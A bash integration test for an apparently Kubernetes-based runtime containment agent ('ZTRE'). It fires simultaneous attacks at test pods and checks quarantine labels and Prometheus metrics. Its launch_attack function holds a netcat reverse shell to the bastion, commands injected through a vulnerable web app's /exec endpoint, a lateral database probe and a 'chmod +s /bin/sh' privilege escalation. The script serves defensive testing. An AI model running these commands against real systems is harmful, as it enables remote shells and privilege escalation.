#!/usr/bin/env bash
# ==============================================================================
# ZTRE Concurrent Multi-Pod Attack Test
# Validates automated quarantine, zero SIGKILL, metric deduplication, and
# absence of 409 conflict errors under concurrent multi-pod attack load.
# ==============================================================================
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

# Pre-set test-specific evidence dir and log before sourcing lib/common.sh
TS="${TS:-$(date +%Y%m%d-%H%M%S)}"
EVIDENCE_DIR="${EVIDENCE_DIR:-evidence/concurrent}"
case "$EVIDENCE_DIR" in
  /*) : ;;
  *) EVIDENCE_DIR="$REPO_ROOT/$EVIDENCE_DIR" ;;
esac
mkdir -p "$EVIDENCE_DIR"

LOG="${LOG:-$EVIDENCE_DIR/concurrent-attack-$TS.log}"
RESULTS_FILE="${RESULTS_FILE:-$EVIDENCE_DIR/concurrent-results-$TS.json}"

# Source lib/common.sh (adjust path)
if [ -f "$REPO_ROOT/lib/common.sh" ]; then
    # shellcheck source=/dev/null
    source "$REPO_ROOT/lib/common.sh"
elif [ -f "$SCRIPT_DIR/../lib/common.sh" ]; then
    # shellcheck source=/dev/null
    source "$SCRIPT_DIR/../lib/common.sh"
elif [ -f "$SCRIPT_DIR/lib/common.sh" ]; then
    # shellcheck source=/dev/null
    source "$SCRIPT_DIR/lib/common.sh"
fi

# ---- Configuration -----------------------------------------------------------
NS="${NS:-ztre-test}"
AGENT_NS="${AGENT_NS:-ztre-system}"
AGENT_LABEL="${AGENT_LABEL:-app.kubernetes.io/name=ztre-agent}"
WORKER_IP="${WORKER_IP:-10.91.128.11}"
WORKER_HOST="${WORKER_HOST:-node2@${WORKER_IP}}"
BASTION_IP="${BASTION_IP:-10.91.128.10}"
NODEPORT="${NODEPORT:-30080}"
REV_PORT="${REV_PORT:-4444}"
PROM_PORT="${PROM_PORT:-9092}"

N="${N:-3}"
M="${M:-}"
TARGET_PREFIX="${TARGET_PREFIX:-attack-target}"
USE_VULNERABLE_WEB="${USE_VULNERABLE_WEB:-0}"
RESET_AGENT="${RESET_AGENT:-1}"
DO_CLEANUP="${DO_CLEANUP:-1}"

# ---- CLI Argument Parsing ----------------------------------------------------
while [ $# -gt 0 ]; do
    case "$1" in
        -n|--pods)
            N="$2"; shift 2 ;;
        -m|--attacks)
            M="$2"; shift 2 ;;
        --with-vulnerable-web)
            USE_VULNERABLE_WEB=1; shift ;;
        --without-vulnerable-web)
            USE_VULNERABLE_WEB=0; shift ;;
        --no-cleanup)
            DO_CLEANUP=0; shift ;;
        --no-reset)
            RESET_AGENT=0; shift ;;
        -h|--help)
            echo "Usage: $0 [-n <pods>] [-m <attacks>] [--with-vulnerable-web] [--no-cleanup] [--no-reset]"
            exit 0 ;;
        *)
            shift ;;
    esac
done

# ---- Helpers & Tracking ------------------------------------------------------
CATCHER_PID=""
PF_PID=""
DEPLOYED_PODS=()
DISTINCT_PODS=()
RESULTS=()
VULN_WEB_POD=""

COLOR_GREEN="\033[0;32m"
COLOR_RED="\033[0;31m"
COLOR_BLUE="\033[0;34m"
COLOR_RESET="\033[0m"

say()      { echo -e "$*" | tee -a "$LOG"; }
log_info() { say "${COLOR_BLUE}[INFO]${COLOR_RESET} $*"; }
log_pass() { say "${COLOR_GREEN}[PASS]${COLOR_RESET} $*"; }
log_fail() { say "${COLOR_RED}[FAIL]${COLOR_RESET} $*"; }
hdr()      { say ""; say "============================================================"; say "$*"; say "============================================================"; }

cleanup() {
    local ec=$?
    trap - EXIT INT TERM
    say ""
    log_info "Initiating cleanup..."

    if [ -n "$CATCHER_PID" ] && kill -0 "$CATCHER_PID" 2>/dev/null; then
        kill "$CATCHER_PID" 2>/dev/null || true
    fi

    if [ -n "$PF_PID" ] && kill -0 "$PF_PID" 2>/dev/null; then
        kill "$PF_PID" 2>/dev/null || true
    fi
    pkill -f "port-forward.*prometheus.*${PROM_PORT}" 2>/dev/null || true

    if [ "$DO_CLEANUP" = "1" ]; then
        if [ ${#DEPLOYED_PODS[@]} -gt 0 ]; then
            log_info "Deleting deployed test pods..."
            for p in "${DEPLOYED_PODS[@]}"; do
                kubectl delete pod "$p" -n "$NS" --now --ignore-not-found=true >/dev/null 2>&1 || true
            done
        fi
        if [ -n "$VULN_WEB_POD" ]; then
            log_info "Clearing quarantine label on $VULN_WEB_POD..."
            kubectl label pod -n "$NS" "$VULN_WEB_POD" ztre/quarantine- --overwrite >/dev/null 2>&1 || true
        fi
    else
        log_info "Skipping resource deletion (cleanup disabled)"
    fi

    exit "$ec"
}
trap cleanup EXIT INT TERM

# Multi-connection TCP listener via python3 (bastion has no nc)
tcp_catcher() {
    local port="$1"
    local secs="$2"
    python3 - "$port" "$secs" <<'PY'
import socket, sys, threading

port = int(sys.argv[1])
secs = float(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    s.bind(("0.0.0.0", port))
    s.listen(10)
    s.settimeout(secs)
except Exception:
    sys.exit(0)

def handle(conn):
    try:
        conn.settimeout(secs)
        while True:
            d = conn.recv(1024)
            if not d:
                break
    except Exception:
        pass
    finally:
        try:
            conn.close()
        except Exception:
            pass

threads = []
try:
    while True:
        try:
            conn, _ = s.accept()
            t = threading.Thread(target=handle, args=(conn,))
            t.daemon = True
            t.start()
            threads.append(t)
        except socket.timeout:
            break
except Exception:
    pass
finally:
    try:
        s.close()
    except Exception:
        pass

for t in threads:
    t.join(timeout=1.0)
PY
}

# Query Prometheus scalar via port-forward
promval() {
    local expr="$1"
    # Fast path: read the agent's own /metrics endpoint directly via the worker
    # node (instant, no scrape-interval lag). Only supports the simple
    # sum(<metric>) / <metric> forms used by this test.
    local metric
    metric=$(echo "$expr" | sed -n 's/.*(\([a-z_][a-z0-9_]*\)).*/\1/p')
    [ -n "$metric" ] || metric=$(echo "$expr" | tr -d ' ')
    local apod apip
    apod=$(kubectl get pod -n ztre-system -l app.kubernetes.io/name=ztre-agent -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
    apip=$(kubectl get pod -n ztre-system "$apod" -o jsonpath='{.status.podIP}' 2>/dev/null)
    if [ -n "$apip" ] && [ -n "${WORKER_HOST:-}" ]; then
        local direct
        direct=$(ssh -o BatchMode=yes -o ConnectTimeout=4 "$WORKER_HOST" \
            "curl -s --max-time 3 http://$apip:9090/metrics" 2>/dev/null \
            | awk -v m="$metric" '$1==m {s+=$2} END {printf "%.0f", s}')
        if [ -n "$direct" ]; then echo "$direct"; return; fi
    fi
    # Fallback: Prometheus query API over the port-forward.
    local enc
    enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$expr")
    curl -sf "http://127.0.0.1:${PROM_PORT}/api/v1/query?query=${enc}" 2>/dev/null | python3 -c '
import json,sys
try:
    d = json.load(sys.stdin)
    r = d["data"]["result"]
    print(r[0]["value"][1] if r else "0")
except Exception:
    print("")
'
}

# ==============================================================================
# PHASE 0: Pre-flight diagnostics & dedup cache reset
# ==============================================================================
hdr "PHASE 0: Pre-flight diagnostics & dedup cache reset"

for tool in curl jq kubectl python3; do
    command -v "$tool" >/dev/null 2>&1 || {
        log_fail "Required tool $tool not found on bastion"
        exit 1
    }
done
log_pass "Required CLI tools verified (curl, jq, kubectl, python3)"

# Verify worker reachability (bastion has no ping)
if ssh -o BatchMode=yes -o ConnectTimeout=3 node2@"$WORKER_IP" true 2>/dev/null; then
    log_pass "Worker node $WORKER_IP reachable via SSH"
else
    log_info "Notice: Direct SSH to worker $WORKER_IP failed; proceeding via kubectl API"
fi

if [ "$RESET_AGENT" = "1" ]; then
    log_info "Clearing prior quarantine labels in $NS..."
    kubectl label pod -n "$NS" --all ztre/quarantine- --overwrite >/dev/null 2>&1 || true

    log_info "Restarting ztre-agent daemonset to clear sync.Map dedup cache..."
    kubectl rollout restart daemonset -n "$AGENT_NS" ztre-agent >/dev/null 2>&1 || true
    kubectl rollout status daemonset -n "$AGENT_NS" ztre-agent --timeout=45s >/dev/null 2>&1 || true

    NEW_AGENT_POD=$(kubectl get pod -n "$AGENT_NS" -l "$AGENT_LABEL" --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    if [ -n "$NEW_AGENT_POD" ]; then
        for _ in $(seq 1 20); do
            if kubectl logs -n "$AGENT_NS" "$NEW_AGENT_POD" 2>/dev/null | grep -q "Tetragon gRPC event stream established"; then
                log_pass "Agent gRPC event stream verified open on $NEW_AGENT_POD"
                break
            fi
            sleep 1
        done
    fi
    sleep 2
fi

# ==============================================================================
# PHASE 1: Deploy target workloads
# ==============================================================================
hdr "PHASE 1: Deploy target workloads"

log_info "Deploying $N target pods (alpine, sleep) in namespace $NS..."
for i in $(seq 1 "$N"); do
    pname="${TARGET_PREFIX}-${i}"
    kubectl delete pod "$pname" -n "$NS" --now --ignore-not-found=true >/dev/null 2>&1 || true
done

for i in $(seq 1 "$N"); do
    pname="${TARGET_PREFIX}-${i}"
    kubectl run "$pname" -n "$NS" \
        --image=alpine \
        --restart=Never \
        --labels="app=${pname},test=concurrent-attack" \
        -- /bin/sh -c 'sleep 3600' \
        >/dev/null 2>&1
    DEPLOYED_PODS+=("$pname")
done

log_info "Waiting for all $N target pods to enter Ready state..."
for pname in "${DEPLOYED_PODS[@]}"; do
    kubectl wait --for=condition=Ready "pod/${pname}" -n "$NS" --timeout=60s >/dev/null 2>&1 || {
        log_fail "Pod $pname failed to become Ready within 60s"
        exit 1
    }
done
log_pass "All $N target pods running and Ready"

# Optional vulnerable-web NodePort target
AVAILABLE_TARGETS=("${DEPLOYED_PODS[@]}")
if [ "$USE_VULNERABLE_WEB" = "1" ] || [ "$USE_VULNERABLE_WEB" = "true" ]; then
    log_info "Probing optional vulnerable-web service on NodePort $NODEPORT..."
    VULN_WEB_POD=$(kubectl get pod -n "$NS" -l "app=vulnerable-web" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    if [ -n "$VULN_WEB_POD" ] && curl -sf --connect-timeout 3 "http://${WORKER_IP}:${NODEPORT}/healthz" >/dev/null 2>&1; then
        kubectl label pod -n "$NS" "$VULN_WEB_POD" ztre/quarantine- --overwrite >/dev/null 2>&1 || true
        AVAILABLE_TARGETS+=("$VULN_WEB_POD")
        log_pass "vulnerable-web ready (pod: $VULN_WEB_POD, NodePort: $NODEPORT)"
    else
        log_fail "vulnerable-web unreachable at http://${WORKER_IP}:${NODEPORT}; skipping optional web target"
        VULN_WEB_POD=""
    fi
fi

# ==============================================================================
# PHASE 2: Prometheus metrics baseline
# ==============================================================================
hdr "PHASE 2: Establish Prometheus baseline"

pkill -f "port-forward.*prometheus.*${PROM_PORT}" 2>/dev/null || true
sleep 1
kubectl port-forward -n monitoring svc/prometheus "${PROM_PORT}:9090" --address 127.0.0.1 \
    >/tmp/concurrent-prom-pf.log 2>&1 &
PF_PID=$!

PROM_OK=false
for _ in $(seq 1 10); do
    if curl -sf "http://127.0.0.1:${PROM_PORT}/api/v1/query?query=up" >/dev/null 2>&1; then
        PROM_OK=true
        break
    fi
    sleep 1
done

[ "$PROM_OK" = true ] || {
    log_fail "Prometheus port-forward failed on port $PROM_PORT"
    exit 1
}
log_pass "Prometheus query endpoint reachable on 127.0.0.1:${PROM_PORT}"

# The agent DaemonSet was restarted in Phase 0, which resets all in-process
# counters. Prometheus may still return the OLD pod's last sample until it
# scrapes the new pod. Wait until the value is STABLE across two scrapes before
# capturing the baseline, so the delta reflects only this test's attacks.
PRE_CONTAINMENTS=""
prev=""
for _ in $(seq 1 45); do
    cur=$(promval 'sum(ztre_containment_actions_total)')
    if [ -n "$prev" ] && [ "$cur" = "$prev" ]; then
        PRE_CONTAINMENTS="$cur"
        break
    fi
    prev="$cur"
    sleep 2
done
[ -n "$PRE_CONTAINMENTS" ] || PRE_CONTAINMENTS=$(promval 'sum(ztre_containment_actions_total)')

PRE_ERRORS=$(promval 'sum(ztre_api_errors_total)')
PRE_DROPPED=$(promval 'sum(ztre_events_dropped_total)')

log_info "Baseline metrics: containments=${PRE_CONTAINMENTS:-0}, api_errors=${PRE_ERRORS:-0}, dropped=${PRE_DROPPED:-0}"

# ==============================================================================
# PHASE 3: Execute concurrent attacks
# ==============================================================================
hdr "PHASE 3: Execute concurrent multi-pod attacks"

if [ -z "$M" ]; then
    M="${#AVAILABLE_TARGETS[@]}"
fi

TARGET_LIST=()
VECTOR_LIST=()
IS_WEB_LIST=()
ATTACKED_TARGETS=()

for idx in $(seq 0 $((M - 1))); do
    t_idx=$(( idx % ${#AVAILABLE_TARGETS[@]} ))
    tgt="${AVAILABLE_TARGETS[$t_idx]}"
    v_type=$(( idx % 3 ))
    is_web=0
    [ -n "$VULN_WEB_POD" ] && [ "$tgt" = "$VULN_WEB_POD" ] && is_web=1

    TARGET_LIST+=("$tgt")
    VECTOR_LIST+=("$v_type")
    IS_WEB_LIST+=("$is_web")
    ATTACKED_TARGETS+=("$tgt")
done

DISTINCT_PODS=($(printf '%s\n' "${ATTACKED_TARGETS[@]}" | sort -u))
DISTINCT_COUNT="${#DISTINCT_PODS[@]}"
log_info "Planned $M simultaneous attacks across $DISTINCT_COUNT distinct pods (${DISTINCT_PODS[*]}):"

for idx in $(seq 0 $((M - 1))); do
    case "${VECTOR_LIST[$idx]}" in
        0) vname="reverse shell (nc $BASTION_IP $REV_PORT -e /bin/sh)" ;;
        1) vname="lateral probe (wget -q http://database:5432)" ;;
        2) vname="privilege escalation (chmod +s /bin/sh)" ;;
    esac
    log_info "  Attack #$((idx + 1)): pod=${TARGET_LIST[$idx]} -> $vname"
done

HAS_REV=0
for v in "${VECTOR_LIST[@]}"; do
    [ "$v" -eq 0 ] && HAS_REV=1
done

if [ "$HAS_REV" -eq 1 ]; then
    pkill -f "python3.*${REV_PORT}" 2>/dev/null || true
    tcp_catcher "$REV_PORT" 20 &
    CATCHER_PID=$!
    sleep 0.5
    log_info "Bastion TCP listener running on port $REV_PORT (PID: $CATCHER_PID)"
fi

launch_attack() {
    local target="$1"
    local vtype="$2"
    local is_web="$3"

    if [ "$is_web" = "1" ]; then
        case "$vtype" in
            0) curl -sf -m 5 "http://${WORKER_IP}:${NODEPORT}/exec?cmd=nc+${BASTION_IP}+${REV_PORT}+-e+/bin/sh" >/dev/null 2>&1 || true ;;
            1) curl -sf -m 5 "http://${WORKER_IP}:${NODEPORT}/exec?cmd=wget+-q+-O+-+http://database:5432" >/dev/null 2>&1 || true ;;
            2) curl -sf -m 5 "http://${WORKER_IP}:${NODEPORT}/exec?cmd=chmod+%2Bs+/bin/sh" >/dev/null 2>&1 || true ;;
        esac
    else
        case "$vtype" in
            0) kubectl exec -n "$NS" "$target" -- /bin/sh -c "nc $BASTION_IP $REV_PORT -e /bin/sh" >/dev/null 2>&1 || true ;;
            1) kubectl exec -n "$NS" "$target" -- /bin/sh -c "wget -q -T 3 -O - http://database:5432 || true" >/dev/null 2>&1 || true ;;
            2) kubectl exec -n "$NS" "$target" -- /bin/sh -c "chmod +s /bin/sh" >/dev/null 2>&1 || true ;;
        esac
    fi
}

ATTACK_PIDS=()
T_FIRST=0
T_LAST=0

log_info "Firing $M attacks simultaneously..."
for idx in $(seq 0 $((M - 1))); do
    NOW_MS=$(date +%s%3N)
    [ "$T_FIRST" -eq 0 ] && T_FIRST="$NOW_MS"
    T_LAST="$NOW_MS"

    launch_attack "${TARGET_LIST[$idx]}" "${VECTOR_LIST[$idx]}" "${IS_WEB_LIST[$idx]}" &
    ATTACK_PIDS+=($!)
done

LAUNCH_SKEW_MS=$(( T_LAST - T_FIRST ))
[ "$LAUNCH_SKEW_MS" -lt 0 ] && LAUNCH_SKEW_MS=0
log_info "All $M attacks launched (wall-clock skew: ${LAUNCH_SKEW_MS}ms)"

DEADLINE=$(( $(date +%s) + 10 ))
for pid in "${ATTACK_PIDS[@]}"; do
    while kill -0 "$pid" 2>/dev/null; do
        if [ "$(date +%s)" -ge "$DEADLINE" ]; then
            kill "$pid" 2>/dev/null || true
            break
        fi
        sleep 0.1
    done
done

if [ -n "$CATCHER_PID" ] && kill -0 "$CATCHER_PID" 2>/dev/null; then
    kill "$CATCHER_PID" 2>/dev/null || true
fi

# ==============================================================================
# PHASE 4: Verification & Metrics Assertion
# ==============================================================================
hdr "PHASE 4: Verification & Metrics Assertion"

log_info "Waiting 5s for ZTRE containment processing..."
sleep 5

PASS_COUNT=0
FAIL_COUNT=0
RESULTS=()

for pod in "${DISTINCT_PODS[@]}"; do
    LABEL=""
    PHASE="Unknown"
    RESTARTS="0"
    CONTAINED=false

    for _ in $(seq 1 15); do
        LABEL=$(kubectl get pod "$pod" -n "$NS" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || echo "")
        PHASE=$(kubectl get pod "$pod" -n "$NS" -o jsonpath='{.status.phase}' 2>/dev/null || echo "Unknown")
        RESTARTS=$(kubectl get pod "$pod" -n "$NS" -o jsonpath='{.status.containerStatuses[0].restartCount}' 2>/dev/null || echo "0")

        if [ "$LABEL" = "true" ]; then
            CONTAINED=true
            break
        fi
        sleep 1
    done

    if [ "$CONTAINED" = true ] && [ "$PHASE" = "Running" ] && [ "$RESTARTS" = "0" ]; then
        log_pass "Pod $pod: CONTAINED (label=$LABEL, phase=$PHASE, restarts=$RESTARTS)"
        PASS_COUNT=$((PASS_COUNT + 1))
        STATUS="CONTAINED"
    else
        log_fail "Pod $pod: FAILED (label=${LABEL:-<none>}, phase=$PHASE, restarts=$RESTARTS)"
        FAIL_COUNT=$((FAIL_COUNT + 1))
        STATUS="MISSED"
    fi
    RESULTS+=("{\"pod\":\"$pod\",\"status\":\"$STATUS\",\"phase\":\"$PHASE\",\"restarts\":$RESTARTS}")
done

log_info "Polling Prometheus metrics for scrape update (up to 25s)..."
POST_CONTAINMENTS="$PRE_CONTAINMENTS"
NEW_CONTAINMENTS=0

# Poll until the counter reaches the expected delta, then confirm it is STABLE
# across two consecutive samples (Prometheus scrape interval is 15s; a single
# sample can land mid-increment and under-report).
for _ in $(seq 1 45); do
    POST_CONTAINMENTS=$(promval 'sum(ztre_containment_actions_total)')
    NEW_CONTAINMENTS=$(awk "BEGIN {printf \"%.0f\", ${POST_CONTAINMENTS:-0} - ${PRE_CONTAINMENTS:-0}}")
    if [ "${NEW_CONTAINMENTS:-0}" -ge "$DISTINCT_COUNT" ]; then
        sleep 16   # wait one full scrape interval, then re-read to confirm
        CONFIRM=$(promval 'sum(ztre_containment_actions_total)')
        NEW_CONFIRM=$(awk "BEGIN {printf \"%.0f\", ${CONFIRM:-0} - ${PRE_CONTAINMENTS:-0}}")
        if [ "${NEW_CONFIRM:-0}" -eq "${NEW_CONTAINMENTS:-0}" ]; then
            break
        fi
        NEW_CONTAINMENTS="$NEW_CONFIRM"
    fi
    sleep 1
done

POST_ERRORS=$(promval 'sum(ztre_api_errors_total)')
POST_DROPPED=$(promval 'sum(ztre_events_dropped_total)')

NEW_ERRORS=$(awk "BEGIN {printf \"%.0f\", ${POST_ERRORS:-0} - ${PRE_ERRORS:-0}}")
NEW_DROPPED=$(awk "BEGIN {printf \"%.0f\", ${POST_DROPPED:-0} - ${PRE_DROPPED:-0}}")

METRIC_PASS=true

if [ "${NEW_CONTAINMENTS:-0}" -eq "$DISTINCT_COUNT" ]; then
    log_pass "Prometheus ztre_containment_actions_total increased by exactly $DISTINCT_COUNT (delta: +$NEW_CONTAINMENTS)"
else
    log_fail "Prometheus ztre_containment_actions_total mismatch: expected +$DISTINCT_COUNT, got +${NEW_CONTAINMENTS:-0}"
    METRIC_PASS=false
fi

if [ "${NEW_ERRORS:-0}" -eq 0 ]; then
    log_pass "Prometheus ztre_api_errors_total delta: 0 (no 409 conflict or API errors)"
else
    log_fail "Prometheus ztre_api_errors_total delta: +$NEW_ERRORS (expected 0)"
    METRIC_PASS=false
fi

if [ "${NEW_DROPPED:-0}" -eq 0 ]; then
    log_pass "Prometheus ztre_events_dropped_total delta: 0 (no dropped buffer events)"
else
    log_info "Prometheus ztre_events_dropped_total delta: +$NEW_DROPPED"
fi

SKEW_PASS=true
if [ "$LAUNCH_SKEW_MS" -lt 200 ]; then
    log_pass "Launch concurrency verified: skew ${LAUNCH_SKEW_MS}ms < 200ms"
else
    log_fail "Launch concurrency check failed: skew ${LAUNCH_SKEW_MS}ms >= 200ms"
    SKEW_PASS=false
fi

if [ "$FAIL_COUNT" -eq 0 ] && [ "$METRIC_PASS" = true ] && [ "$SKEW_PASS" = true ]; then
    VERDICT="PASS"
else
    VERDICT="FAIL"
fi

# ==============================================================================
# PHASE 5: Evidence Export & Summary
# ==============================================================================
hdr "PHASE 5: Evidence Export & Summary"

RESULTS_JSON=$(printf '%s\n' "${RESULTS[@]}" | paste -sd',' -)
cat > "$RESULTS_FILE" <<EOF
{
  "test": "concurrent_multi_attack",
  "timestamp": "$(date -Iseconds)",
  "attacks_launched": ${M},
  "attacks_launched_simultaneously": true,
  "attack_launch_duration_ms": ${LAUNCH_SKEW_MS},
  "launch_skew_ms": ${LAUNCH_SKEW_MS},
  "skew_under_200ms": $( [ "$LAUNCH_SKEW_MS" -lt 200 ] && echo "true" || echo "false" ),
  "distinct_attacked_pods": ${DISTINCT_COUNT},
  "target_pods_deployed": ${N},
  "results": [${RESULTS_JSON}],
  "contained": ${PASS_COUNT},
  "missed": ${FAIL_COUNT},
  "new_containment_actions": "${NEW_CONTAINMENTS}",
  "new_api_errors": "${NEW_ERRORS}",
  "new_events_dropped": "${NEW_DROPPED}",
  "verdict": "${VERDICT}"
}
EOF

cp "$RESULTS_FILE" "$EVIDENCE_DIR/parallel-containment-results.json" 2>/dev/null || true
cp "$RESULTS_FILE" "$EVIDENCE_DIR/concurrent-results-latest.json" 2>/dev/null || true

say ""
say "Test Results Summary:"
say "  Attacks launched        : ${M}"
say "  Distinct pods attacked  : ${DISTINCT_COUNT}"
say "  Launch skew (ms)        : ${LAUNCH_SKEW_MS} (threshold < 200ms)"
say "  Pods contained          : ${PASS_COUNT}/${DISTINCT_COUNT}"
say "  Pods missed             : ${FAIL_COUNT}/${DISTINCT_COUNT}"
say "  New containment actions : ${NEW_CONTAINMENTS} (expected ${DISTINCT_COUNT})"
say "  New API errors          : ${NEW_ERRORS} (expected 0)"
say "  New events dropped      : ${NEW_DROPPED}"
say "  Verdict                 : ${VERDICT}"
say "  Results file            : ${RESULTS_FILE}"
say "  Log file                : ${LOG}"
say ""

if [ "$VERDICT" = "PASS" ]; then
    log_pass "Concurrent attack test completed successfully: VERDICT=PASS"
    exit 0
else
    log_fail "Concurrent attack test failed: VERDICT=FAIL"
    exit 1
fi
